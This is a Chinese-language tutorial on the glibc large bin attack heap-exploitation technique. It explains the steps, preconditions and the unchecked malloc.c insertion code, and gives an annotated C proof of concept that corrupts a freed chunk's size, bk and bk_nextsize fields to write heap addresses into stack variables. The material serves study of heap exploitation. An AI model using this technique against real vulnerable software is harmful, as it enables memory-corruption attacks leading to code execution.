# 漏洞利用文档：Large Bin Attack

## 攻击对象
- **目标内存位置**：栈变量 `stack_var1`（地址 `0x7fffffffe300`）和 `stack_var2`（地址 `0x7fffffffe308`）。在一般利用中，large bin attack 可以针对任何可写内存地址，如 libc 中的全局变量 `global_max_fast`（用于后续 fastbin attack）或其他关键数据结构。
- **攻击焦点**：通过修改 large bin 中 chunk 的元数据（如 `size`、`bk` 和 `bk_nextsize` 指针），利用 Glibc 的 large bin 管理机制实现任意地址写入。

## 利用过程
1. **分配阶段**：分配多个大 chunk（大小超过 small bin 范围，例如 0x420 和 0x500），并通过分配 fastbin chunk 避免合并。
2. **释放阶段**：释放部分大 chunk 到 unsorted bin，形成链表。
3. **触发排序**：通过 malloc 较小 chunk 触发 large bin 排序，将特定 chunk 移动到 large bin。
4. **漏洞利用**：修改 large bin 中 chunk 的元数据（模拟漏洞，如堆溢出或 UAF），调整 `size`、`bk` 和 `bk_nextsize` 指针指向目标地址附近。
5. **触发攻击**：再次 malloc，触发 large bin 插入操作，执行 `victim->bk_nextsize->fd_nextsize = victim` 和 `bck->fd = victim`，实现任意地址写入。

## 利用条件
- **漏洞要求**：存在允许修改已释放 large bin chunk 元数据的漏洞，如堆溢出、use-after-free (UAF)、或 double free。程序中需有悬空指针或写操作能覆盖 chunk 的 `size`、`bk` 和 `bk_nextsize` 字段。
- **内存布局**：需要控制 chunk 的大小和指针，确保在 large bin 插入时能指向目标地址。目标地址必须可写。
- **堆管理状态**：unsorted bin 和 large bin 需有特定 chunk，以便触发排序和插入操作。

## 利用效果
- **任意地址写入**：可以将一个堆地址（或其他可控值）写入任意内存位置，如栈变量或全局变量。
- **后续攻击基础**：常用于修改 libc 全局变量（如 `global_max_fast`），为 fastbin attack 或控制流劫持做准备。可能导致 use-after-free (UAF)、double free (DF)、或任意代码执行。
- **演示效果**：在 PoC 中，栈变量 `stack_var1` 和 `stack_var2` 被改写为堆地址 `0x6039a0`。

## 涉及缓解机制
Large bin attack 利用 Glibc 堆管理代码中缺乏指针验证的缺陷。关键代码片段来自 `malloc.c` 中的 large bin 插入逻辑（类似以下伪代码），没有检查 `bk` 和 `bk_nextsize` 指针的有效性：

```c
// 来自 Glibc 源码的 large bin 插入部分
else
{
    victim->fd_nextsize = fwd;
    victim->bk_nextsize = fwd->bk_nextsize;
    fwd->bk_nextsize = victim;
    victim->bk_nextsize->fd_nextsize = victim;  // 任意写入点 1
}
bck = fwd->bk;
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;  // 任意写入点 2
```

- **缓解缺失**：Glibc 没有验证 `victim->bk_nextsize` 和 `bck`（即 `fwd->bk`）是否指向有效内存，允许恶意指针导致任意地址写入。
- **现代缓解**：较新 Glibc 版本可能添加了更多检查（如 `unlink` 宏中的安全验证），但 large bin 攻击仍可能在特定条件下有效，取决于漏洞上下文。

## Proof of Concept
以下为漏洞利用原型源码，添加中文注释解释关键步骤：

```c
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

int main()
{
    fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
    fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    // 分配第一个大chunk（大小0x420），用于后续释放到unsorted bin
    unsigned long *p1 = malloc(0x420);
    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);

    // 分配一个fastbin chunk（大小0x20），防止释放时与相邻chunk合并
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the first large chunk during the free()\n\n");
    malloc(0x20);

    // 分配第二个大chunk（大小0x500），用于移动到large bin并修改
    unsigned long *p2 = malloc(0x500);
    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);

    // 分配另一个fastbin chunk，防止合并
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the second large chunk during the free()\n\n");
    malloc(0x20);

    // 分配第三个大chunk（大小0x500），作为攻击的victim chunk
    unsigned long *p3 = malloc(0x500);
    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
 
    // 分配fastbin chunk，防止与top chunk合并
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
           " the third large chunk during the free()\n\n");
    malloc(0x20);
 
    // 释放p1和p2到unsorted bin，形成链表
    free(p1);
    free(p2);
    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));

    // 分配较小chunk（大小0x90），触发large bin排序：p2被移动到large bin，p1被分割并部分分配
    malloc(0x90);
    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));

    // 释放p3到unsorted bin，为攻击准备victim chunk
    free(p3);
    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
 
    //------------VULNERABILITY-----------
    // 模拟漏洞：通过堆溢出或UAF修改已释放p2 chunk的元数据（p2在large bin中）
    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");

    // 恶意修改p2的元数据：
    p2[-1] = 0x3f1;  // 修改size字段为0x3f1（减小大小），强制后续malloc将p3插入large bin头部
    p2[0] = 0;       // 清空fd指针
    p2[2] = 0;       // 清空fd_nextsize指针
    p2[1] = (unsigned long)(&stack_var1 - 2);  // 设置bk指针指向stack_var1前16字节（计算地址）
    p2[3] = (unsigned long)(&stack_var2 - 4);  // 设置bk_nextsize指针指向stack_var2前32字节

    //------------------------------------

    // 触发large bin attack：malloc操作导致large bin插入，执行写入操作
    malloc(0x90);
 
    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
            " During this time, targets should have already been rewritten:\n");

    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    // 验证攻击成功：栈变量被改写为非零值（堆地址）
    assert(stack_var1 != 0);
    assert(stack_var2 != 0);

    return 0;
}
```

此 PoC 演示了如何通过 large bin attack 实现任意地址写入。在实际漏洞利用中，需根据具体环境调整目标地址和 chunk 大小。